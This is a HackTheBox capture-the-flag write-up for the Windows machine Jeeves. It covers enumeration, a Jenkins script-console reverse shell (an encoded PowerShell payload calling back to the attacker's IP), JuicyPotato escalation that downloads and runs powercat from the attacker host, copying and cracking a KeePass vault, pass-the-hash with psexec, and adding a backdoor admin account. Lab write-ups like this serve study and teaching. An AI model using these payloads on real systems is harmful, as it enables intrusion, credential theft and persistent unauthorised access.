---
render_with_liquid: false
title: HackTheBox Writeup  Jeeves
date: 2023-12-22 12:21:19 +1400
tags: [hackthebox, nmap, windows, netexec, feroxbuster, enum, jenkins, jenkins2rce, privilege-token, juicy-potato, powercat, alternative-data-stream, oscp-like-2023, discover-secrets, keepass2, keepass2john, kpcli, impacket, uac-bypass]
---




# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves]
└─$ pt init '10.129.228.112 Jeeves'
+---------+--------+----------------+--------+
| PROFILE | STATUS |       IP       | DOMAIN |
+---------+--------+----------------+--------+
| jeeves  | on     | 10.129.228.112 | Jeeves |
+---------+--------+----------------+--------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Fri Dec 22 12:21:18 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80,135,445,50000 Jeeves
Nmap scan report for Jeeves (10.129.228.112)
Host is up, received user-set (0.29s latency).
Scanned at 2023-12-22 12:21:19 CST for 51s

PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 58009/tcp): CLEAN (Timeout)
|   Check 2 (port 29516/tcp): CLEAN (Timeout)
|   Check 3 (port 39602/udp): CLEAN (Timeout)
|   Check 4 (port 20654/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2023-12-22T09:21:46
|_  start_date: 2023-12-22T08:17:24
|_clock-skew: mean: 5h00m14s, deviation: 0s, median: 5h00m13s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Dec 22 12:22:10 2023 -- 1 IP address (1 host up) scanned in 51.71 seconds
```

## 445 - SMB

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves]
└─$ nxc smb Jeeves -u '' -p ''
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\: STATUS_ACCESS_DENIED

┌──(bravosec㉿fsociety)-[~/htb/Jeeves]
└─$ nxc smb Jeeves -u 'a' -p ''
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\a: STATUS_LOGON_FAILURE
```

## 80 - Site : Ask Jeeves


### Info

```ruby
http://10.129.228.112 [200] [Ask Jeeves] [Microsoft-IIS/10.0] [IIS:10.0,Windows Server] [e04de8aba843ed85826ec3554e9fb6b02af42dba]
```

Basically a static web

![](/assets/obsidian/383763a72e5e7721d42c65882d709e9a.png)

### Directory

Since this is windows OS, the directory name is case insensitive, use lowercase wordlist to save time

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves]
└─$ feroxbuster -t 150 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o ferox_80.txt -k -u http://10.129.228.112

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.228.112
 🚀  Threads               │ 150
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80.txt
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        4w       50c http://10.129.228.112/error.html
200      GET      147l      319w     3744c http://10.129.228.112/style.css
200      GET       17l       40w      503c http://10.129.228.112/
[####################] - 5m    207633/207633  0s      found:3       errors:0
[####################] - 5m    207629/207629  661/s   http://10.129.228.112/ 
```

## 50000 - Site : Jetty(9.4.z-SNAPSHOT)


### Info

```ruby
http://10.129.228.112:50000 [404] [Error 404 Not Found] [Jetty(9.4.z-SNAPSHOT)] [Java,Jetty:9.4] [d44ca389077333227171d66074ee21d84ed8ed77]
```

![](/assets/obsidian/563a5487ad8b79a60ab2f5d38ce31cd4.png)

### Directory

Since this is windows OS, the directory name is case insensitive, use lowercase wordlist to save time

```bash
feroxbuster -t 150 -o ferox_50000.txt -k -u http://10.129.228.112:50000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves]
└─$ cat ferox_50000.txt | awk '$1!=404'
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves => http://10.129.228.112:50000/askjeeves/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/search => http://10.129.228.112:50000/askjeeves/search/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/people => http://10.129.228.112:50000/askjeeves/people/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/security => http://10.129.228.112:50000/askjeeves/security/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/about => http://10.129.228.112:50000/askjeeves/about/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/projects => http://10.129.228.112:50000/askjeeves/projects/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/version => http://10.129.228.112:50000/askjeeves/version/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/assets => http://10.129.228.112:50000/askjeeves/assets/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/columns => http://10.129.228.112:50000/askjeeves/columns/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/logout => http://10.129.228.112:50000/askjeeves/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/url => http://10.129.228.112:50000/askjeeves/url/
403      GET        8l       10w      589c http://10.129.228.112:50000/askjeeves/me
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/people/api => http://10.129.228.112:50000/askjeeves/people/api/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/columns/00 => http://10.129.228.112:50000/askjeeves/columns/00/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/lookup => http://10.129.228.112:50000/askjeeves/lookup/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/widgets => http://10.129.228.112:50000/askjeeves/widgets/
200      GET       14l      558w    12077c http://10.129.228.112:50000/askjeeves/script
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/authentication => http://10.129.228.112:50000/askjeeves/authentication/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/people/api/search => http://10.129.228.112:50000/askjeeves/people/api/search/
200      GET        1l        2w      178c http://10.129.228.112:50000/askjeeves/people/api/xml
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/security/class => http://10.129.228.112:50000/askjeeves/security/class/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/projects/class => http://10.129.228.112:50000/askjeeves/projects/class/
200      GET       82l      916w    12381c http://10.129.228.112:50000/askjeeves/people/api/index
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/people/class => http://10.129.228.112:50000/askjeeves/people/class/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/api/search => http://10.129.228.112:50000/askjeeves/api/search/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/api => http://10.129.228.112:50000/askjeeves/api/
200      GET        1l        8w      667c http://10.129.228.112:50000/askjeeves/api/xml
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/assets/class => http://10.129.228.112:50000/askjeeves/assets/class/
200      GET      102l     1116w    13997c http://10.129.228.112:50000/askjeeves/api/index
400      GET       14l      253w     7000c http://10.129.228.112:50000/askjeeves/error
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/widgets/00 => http://10.129.228.112:50000/askjeeves/widgets/00/
200      GET        1l        4w      547c http://10.129.228.112:50000/askjeeves/api/python
500      GET       96l      605w    15401c http://10.129.228.112:50000/askjeeves/assets/dynamic
405      GET        4l       13w      196c http://10.129.228.112:50000/askjeeves/eval
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/columns/002 => http://10.129.228.112:50000/askjeeves/columns/002/
500      GET       98l      608w    15817c http://10.129.228.112:50000/askjeeves/widgets/00/index
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/columns/000 => http://10.129.228.112:50000/askjeeves/columns/000/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/columns/005 => http://10.129.228.112:50000/askjeeves/columns/005/
200      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/columns/00/config
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/people/api/class => http://10.129.228.112:50000/askjeeves/people/api/class/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/lookup/class => http://10.129.228.112:50000/askjeeves/lookup/class/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/columns/00/class => http://10.129.228.112:50000/askjeeves/columns/00/class/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/api/class => http://10.129.228.112:50000/askjeeves/api/class/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/assets/class/classes => http://10.129.228.112:50000/askjeeves/assets/class/classes/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/authentication/name => http://10.129.228.112:50000/askjeeves/authentication/name/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/security/class/name => http://10.129.228.112:50000/askjeeves/security/class/name/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/labels => http://10.129.228.112:50000/askjeeves/labels/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/projects/class/class => http://10.129.228.112:50000/askjeeves/projects/class/class/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/assets/class/class => http://10.129.228.112:50000/askjeeves/assets/class/class/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/assets/class/package => http://10.129.228.112:50000/askjeeves/assets/class/package/
302      GET        0l        0w        0c http://10.129.228.112:50000/askjeeves/widgets/0001 => http://10.129.228.112:50000/askjeeves/widgets/0001/
```

# User Flag
---

## Enumeration

### 80

It's just a static page that redirects to a fake error page, user input wasn't processed

![](/assets/obsidian/6eb332fc68728c3de094b128437ca7a2.png)

![](/assets/obsidian/c482a31e4d8c6a02d49772232dc01b5e.png)

![](/assets/obsidian/65f2ef52fb52227545b569d526c42b42.png)

### 50000

Google : `Jetty 9.4.z exploit`

> https://www.exploit-db.com/exploits/50438

This Information Disclosure exploit didn't work

![](/assets/obsidian/6cb679dc6cd17362f5af8d2bf37bc68f.png)

## Shell as kohsuke

### Jenkins RCE with Groovy Script

I can manage **jenkins** without authentication

> http://10.129.228.112:50000/askjeeves/

![](/assets/obsidian/c466cf35192cc49e0c554b1cdf877127.png)

Use **Script Console** execute Groovy script to get a shell

> http://10.129.228.112:50000/askjeeves/script

> https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script

I used `PowerShell #3 (Base64)` payload from [revshells.com](https://www.revshells.com/) and added `-exec bypass` just in case if there's execution policy

```groovy
def process = "powershell -exec bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAwACIALAAxADEAMQAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==".execute()
println "Found text ${process.text}"
```

![](/assets/obsidian/75726ba86a4f6464cc51f3b91b088be2.png)

```powershell
┌──(bravosec㉿fsociety)-[~/htb/Jeeves]
└─$ rlwrap nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.228.112] 49677

PS C:\Users\Administrator\.jenkins> whoami
jeeves\kohsuke
PS C:\Users\Administrator\.jenkins> cat C:\Users\kohsuke\Desktop\user.txt
e3232272596fb47950d59c4cf1e7066a
PS C:\Users\Administrator\.jenkins>
```

# Root Flag
---

## From kohsuke to NT Authority SYSTEM


### Enumeration

```powershell
PS C:\Users\Administrator\.jenkins> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ===========================================
jeeves\kohsuke S-1-5-21-2851396806-8246019-2289784878-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

```powershell
PS C:\Users\Administrator\.jenkins> net user

User accounts for \\JEEVES

-------------------------------------------------------------------------------
Administrator            DefaultAccount            Guest
kohsuke
The command completed successfully.
```

```bash
PS C:\Users\Administrator\.jenkins> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```

### Abusing Privilege Tokens

We can abuse `SeImpersonatePrivilege`

> Powershell reverse shell oneliners in parameters will be too long for **juicypotato** to work, use `DownloadString` to fetch **powershell** script and execute
{: .prompt-tip }

```powershell
PS C:\Users\Administrator\.jenkins> (new-object net.webclient).downloadfile("http://10.10.16.30/win/JuicyPotato.exe", "C:\Programdata\JuicyPotato.exe")
PS C:\Users\Administrator\.jenkins> c:\programdata\JuicyPotato.exe -t * -p cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.16.30/pwsh/powercat.ps1');powercat -c 10.10.16.30 -p 1111 -ep" -l 443
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 443
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

```powershell
┌──(bravosec㉿fsociety)-[~/htb/Jeeves]
└─$ rlwrap nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.228.112] 50178
Windows PowerShell
Copyright (C) 2013 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32>
```


### Get hidden flag from alternative data stream

```powershell
PS C:\users\administrator\desktop> ls -Force | sort LastWriteTime -Descending


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/24/2017   2:51 AM             36 hm.txt
-a----        11/8/2017   9:05 AM            797 Windows 10 Update
                                                 Assistant.lnk
-a-hs-        11/3/2017  10:03 PM            282 desktop.ini

PS C:\users\administrator\desktop> cat hm.txt
The flag is elsewhere.  Look deeper.
```

There was ADS (Alternative Data Stream) in `hm.txt`

```powershell
PS C:\users\administrator\desktop> ls -Force | get-item -Stream *


   FileName: C:\users\administrator\desktop\hm.txt

Stream                   Length
------                   ------
:$DATA                       36
root.txt                     34


   FileName: C:\users\administrator\desktop\Windows 10 Update Assistant.lnk

Stream                   Length
------                   ------
:$DATA                      797
```

Get the content of `root.txt`

```bash
PS C:\users\administrator\desktop> cat .\hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```

# Additional
---

## From kohsuke to Administrator


### Discover Keepass vault

```powershell
PS C:\> ls -Force C:\Users\*\Documents\* | sort LastWriteTime


    Directory: C:\Users\Public\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-       10/30/2015   3:21 AM            278 desktop.ini


    Directory: C:\Users\kohsuke\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx
[...]
```

Receive `CEH.kdbx`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves]
└─$ mkdir -p smb && cd smb

┌──(bravosec㉿fsociety)-[~/htb/Jeeves/smb]
└─$ smbserver.py -smb2support s . -username s -password s
Impacket v0.12.0.dev1+20231114.165227.4b56c18 - Copyright 2023 Fortra
```

```powershell
PS C:\> net use \\10.10.16.30\s /user:s s
The command completed successfully.

PS C:\> cp C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.16.30\s\CEH.kdbx
```


### Crack keepass vault

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves/smb]
└─$ file CEH.kdbx
CEH.kdbx: Keepass password database 2.x KDBX

┌──(bravosec㉿fsociety)-[~/htb/Jeeves/smb]
└─$ keepass2john CEH.kdbx > CEH.kdbx.hash
```

```bash
hashcat CEH.kdbx.hash /opt/wordlists/rockyou.txt -m 13400 --user
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves/smb]
└─$ hashcat CEH.kdbx.hash /opt/wordlists/rockyou.txt -m 13400 --user --show
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
```


### Explore keepass vault

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves/smb]
└─$ export KEEPASSDB=CEH.kdbx

┌──(bravosec㉿fsociety)-[~/htb/Jeeves/smb]
└─$ export KEEPASSDB_PASSWORD=moonshine1

┌──(bravosec㉿fsociety)-[~/htb/Jeeves/smb]
└─$ kpcli ls -e
Database: CEH.kdbx
UNLOCKING...

================================================================================
CEH
================================================================================
Backup stuff
Bank of America
DC Recovery PW
EC-Council
It's a secret
Jenkins admin
Keys to the kingdom
Walmart.com
================================================================================
eMail
================================================================================

================================================================================
General
================================================================================

================================================================================
Homebanking
================================================================================

================================================================================
Internet
================================================================================

================================================================================
Network
================================================================================

================================================================================
Windows
================================================================================
```

Get all entries in CEH

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves/smb]
└─$ group="CEH"; entries="Backup stuff
Bank of America
DC Recovery PW
EC-Council
It's a secret
Jenkins admin
Keys to the kingdom
Walmart.com"; echo "$entries" | while IFS= read -r e; do kpcli get -s "$group/$e"; done
```

```bash
================================================================================
CEH/Backup stuff
================================================================================
name: CEH/Backup stuff
username: ?
password: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
URL:
Notes:
Database: CEH.kdbx
UNLOCKING...

================================================================================
CEH/Bank of America
================================================================================
name: CEH/Bank of America
username: Michael321
password: 12345
URL: https://www.bankofamerica.com
Notes:
Database: CEH.kdbx
UNLOCKING...

================================================================================
CEH/Bank of America
================================================================================
name: CEH/Bank of America
username: Michael321
password: 12345
URL: https://www.bankofamerica.com
Notes:
Database: CEH.kdbx
UNLOCKING...

================================================================================
CEH/DC Recovery PW
================================================================================
name: CEH/DC Recovery PW
username: administrator
password: S1TjAtJHKsugh9oC4VZl
URL:
Notes:
Database: CEH.kdbx
UNLOCKING...

================================================================================
CEH/EC-Council
================================================================================
name: CEH/EC-Council
username: hackerman123
password: pwndyouall!
URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login
```

Save the result to `keepass_dump.txt` then grep for passwords

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves/smb]
└─$ cat keepass_dump.txt | grep password | awk '{print $2}' | sort -u | tee passwords.lst
12345
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
pwndyouall!
S1TjAtJHKsugh9oC4VZl
```

### Password spray

We know only `Administrator` was in the `Administrators` group from enumeration stage 

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves/smb]
└─$ nxc smb Jeeves -u 'administrator' -p passwords.lst
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\administrator:12345 STATUS_LOGON_FAILURE
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\administrator:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 STATUS_LOGON_FAILURE
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\administrator:pwndyouall! STATUS_LOGON_FAILURE
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE
```

Try the NTLM hash, it worked

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves/smb]
└─$ nxc smb Jeeves -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [+] Jeeves\administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```

Use **psexec**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves]
└─$ psexec.py administrator@jeeves -hashes ':e0fb1fb85756c24235ff238cbe81fe00'
Impacket v0.12.0.dev1+20231114.165227.4b56c18 - Copyright 2023 Fortra

[*] Requesting shares on jeeves.....
[*] Found writable share ADMIN$
[*] Uploading file FxqYmVfb.exe
[*] Opening SVCManager on jeeves.....
[*] Creating service GgWs on jeeves.....
[*] Starting service GgWs.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```


## Enable winrm to bypass UAC

I've added user `a` to local `Administrators` group

```bash
PS C:\Windows\system32> net user a a /add; net localgroup Administrators a /add
The command completed successfully.

The command completed successfully.
```

But when trying to login with **psexec** or **wmiexec**, it trhows `rpc_s_access_denied`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves]
└─$ wmiexec.py a:a@Jeeves
Impacket v0.12.0.dev1+20231114.165227.4b56c18 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

This was because of **UAC** (None Domain Joined) or **Remote UAC** (In Domain), users other than RID `500` will be denied (Unless editing the registry key)

A simple way to bypass is to use **WinRM** (Plus, **winrm** allows pass the hash by default)

```bash
Set-NetConnectionProfile -NetworkCategory Private
Enable-PSremoting -Force
Set-NetFirewallRule -DisplayName "Windows Remote Management (HTTP-In)" -RemoteAddress Any
Enable-NetFirewallRule -DisplayName "Windows Remote Management (HTTP-In)"
```

Now I can connect with **winrm** to bypass the check

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jeeves]
└─$ evil-winrm -i Jeeves -u 'a' -p 'a'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

*Evil-WinRM* PS C:\Users\a\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\a\Documents>
```